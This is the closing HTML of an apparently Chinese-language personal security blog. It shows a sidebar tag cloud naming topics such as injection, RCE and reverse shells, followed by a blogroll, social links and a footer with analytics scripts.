                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/csrf" title="csrf">csrf</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/c%e8%af%ad%e8%a8%80" title="c语言">c语言</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/dedecms" title="dedecms">dedecms</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/des" title="des">des</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/deserialize" title="deserialize">deserialize</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/dmz" title="dmz">dmz</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/docker" title="docker">docker</a>
                <sup>6</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/fileupload" title="fileupload">fileupload</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/getshell" title="getshell">getshell</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/git" title="git">git</a>
                <sup>6</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/https" title="https">https</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/injection" title="injection">injection</a>
                <sup>17</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/intranet" title="intranet">intranet</a>
                <sup>11</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/javascript" title="javascript">javascript</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/linux" title="linux">linux</a>
                <sup>11</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/mindmap" title="mindmap">mindmap</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/miscellanea" title="miscellanea">miscellanea</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/module" title="module">module</a>
                <sup>13</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/mongodb" title="mongodb">mongodb</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/mysql" title="mysql">mysql</a>
                <sup>6</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/oracle" title="oracle">oracle</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/pentest" title="pentest">pentest</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/php" title="php">php</a>
                <sup>12</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/poc" title="poc">poc</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/postgresql" title="postgresql">postgresql</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/python" title="python">python</a>
                <sup>33</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/rce" title="rce">rce</a>
                <sup>6</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/redis" title="redis">redis</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/server" title="server">server</a>
                <sup>11</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/software" title="software">software</a>
                <sup>8</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/sqlserver" title="sqlserver">sqlserver</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/ssh%e9%9a%a7%e9%81%93" title="ssh隧道">ssh隧道</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/ssrf" title="ssrf">ssrf</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/thread" title="thread">thread</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/tools" title="tools">tools</a>
                <sup>10</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/tornado" title="tornado">tornado</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/wireless" title="wireless">wireless</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/xml" title="xml">xml</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/xss" title="xss">xss</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="信息泄露">信息泄露</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e5%8f%8d%e5%bc%b9shell" title="反弹shell">反弹shell</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f" title="操作系统">操作系统</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="敏感信息泄露">敏感信息泄露</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" title="文件包含">文件包含</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e6%ad%a3%e5%88%99" title="正则">正则</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e7%88%86%e7%a0%b4" title="爆破">爆破</a>
                <sup>5</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" title="端口转发">端口转发</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e7%bd%91%e7%bb%9c%e8%ae%be%e5%a4%87" title="网络设备">网络设备</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e8%99%9a%e6%8b%9f%e6%9c%ba" title="虚拟机">虚拟机</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" title="逻辑漏洞">逻辑漏洞</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e9%87%8d%e5%ae%9a%e5%90%91" title="重定向">重定向</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e9%92%93%e9%b1%bc" title="钓鱼">钓鱼</a>
                <sup>1</sup>
            </p>
        
    </div>


</div>

        

<div style="padding-bottom:10px;">
    <h2 class="asidetitle">Links</h2>
    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
        <li style="list-style-type:none;">
            <i class="fa fa-link fa-fw"></i><a href="http://www.test404.com/" target="_blank">Test404's Blog</a>
        </li>
        <li style="list-style-type:none;">
            <i class="fa fa-link fa-fw"></i><a href="http://zksmile.me/" target="_blank">Zksmile's Blog</a>
        </li>
        <li style="list-style-type:none;">
            <i class="fa fa-link fa-fw"></i><a href="https://y-hkl.github.io/" target="_blank">Y-HKL's Blog</a>
        </li>
        <li style="list-style-type:none;">
            <i class="fa fa-link fa-fw"></i><a href="https://s.yl0.org/" target="_blank">sòng•sec</a>
        </li>
        <li style="list-style-type:none;">
            <i class="fa fa-link fa-fw"></i><a href="https://xj.hk/" target="_blank">星际 HK</a>
        </li>
    </ul>
</div>

        
<div style="padding-bottom:10px;">
    <h2 class="asidetitle">Social</h2>
    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
        <li style="list-style-type:none;">
            
                <i class="fa fa-github-square fa-fw"></i><a href="https://github.com/reber0" target="_blank">GitHub</a>
            
        </li>
        <li style="list-style-type:none;">
            
                <i class="fa fa-weibo fa-fw"></i><a href="http://weibo.com/u/5819760166" target="_blank">Weibo</a>
            
        </li>
        <li style="list-style-type:none;">
            <i class="fa fa-rss fa-fw"></i><a href="http://wyb0.com/index.xml" target="_blank">RSS</a>
        </li>
    </ul>
</div>
    </div>
</div>

    
<div class="foot">
    <div class="copyright">
        
        Copyright &copy; 2015-<script>var d=new Date();document.write(d.getFullYear());</script> Reber. All Rights Reserved.

        
        <script type="text/javascript" src="//js.users.51.la/19363536.js"></script>
        <a href="https://www.51.la/?19363536" target="_blank" title="51.La 网站流量统计系统">网站统计</a>
        
        <script type="text/javascript" src="//quote.51.la/q?id=19363536&mb=1"></script>
    </div>
    <script>$('.copyright img').remove();</script>
</div>
</div>

    
    <div class="goToTop">
      <a href="#top" id="goToTop">
        <img src="http://wyb0.com/img/goto_top.png" alt="可以返回顶部" title="回到顶部"/>
      </a>
    </div>

    <script src="/js/style.js"></script>

    
    

</body>
</html>

